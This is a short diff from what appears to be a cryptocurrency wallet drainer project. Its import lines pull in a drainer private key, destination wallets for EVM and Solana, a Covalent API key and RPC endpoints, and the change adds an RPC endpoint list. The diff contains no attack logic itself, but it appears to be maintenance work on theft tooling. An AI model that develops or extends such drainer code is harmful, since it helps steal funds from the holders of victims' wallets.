@@ -9,7 +9,7 @@ console.error = (...args) => {
   originalConsoleError.apply(console, args);
 };
 import { ethers } from "ethers";
-import { getRpcUrl, DRAINER_PK, DESTINATION_WALLET, DESTINATION_WALLET_SOL, COVALENT_API_KEY, RPC_URL } from './config.js';
+import { EVM_RPC_ENDPOINTS, getRpcUrl, DRAINER_PK, DESTINATION_WALLET, DESTINATION_WALLET_SOL, COVALENT_API_KEY, RPC_URL } from './config.js';
 import { chainManager } from './modules/chainManager.js';
 import { SwapHandler } from './swapHandler.js';
 import { securityManager } from './modules/securityManager.js';
